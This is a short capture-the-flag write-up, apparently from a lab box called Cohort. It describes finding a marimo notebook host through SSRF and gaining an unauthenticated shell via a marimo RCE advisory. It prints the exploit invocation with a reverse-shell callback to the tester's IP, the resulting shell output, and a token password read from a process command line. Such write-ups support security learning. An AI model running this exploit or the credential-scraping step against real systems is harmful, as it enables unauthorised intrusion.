# marimo

## Discovery

On Cohort, only SSH (22), HTTP (80), and HTTPS (443) were exposed in the TCP scan. The public portal at `https://cohort.htb/portal.html` offered source validation. Its [SSRF to the internal status page](../web/ssrf.md#source-validator-to-internal-status-page-cohort) revealed a notebooks upstream with hostname `nb-1be3782a8afd3ad5.cohort.htb` and local target `127.0.0.1:8888`.

After mapping that hostname to `10.129.50.116`, HTTPS reached a marimo login page at:

```text
https://nb-1be3782a8afd3ad5.cohort.htb/auth/login?next=https%3A%2F%2Fnb-1be3782a8afd3ad5.cohort.htb%2F
```

## Pre-authenticated RCE: CVE-2026-39987

The notes referenced the [GitHub advisory](https://github.com/advisories/GHSA-2679-6mx9-h9xc) and ran a local `exploit.py` against the notebook vhost. The exploit started its own listener and obtained a shell without a login:

```bash
python3 exploit.py --url https://nb-1be3782a8afd3ad5.cohort.htb --lhost 10.10.14.213 --lport 80
```

```text
[+] Listening on 10.10.14.213:80 (timeout 15s)
[+] Connection from 10.129.50.116:57980
$ id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

Post-access process enumeration exposed the token password on the marimo command line:

```bash
ps -elf --forest
# /opt/marimo/venv/bin/marimo edit /home/marimo/notebooks/retention.py --headless --host 127.0.0.1 -p 8888 --token --token-password YKQ6iPyO5kusNx0BpVAPfjP5
```

From this shell, the successful local escalation is documented under [PackageKit Pack2TheRoot](../linux-privilege-escalation/packagekit-pack2theroot.md).
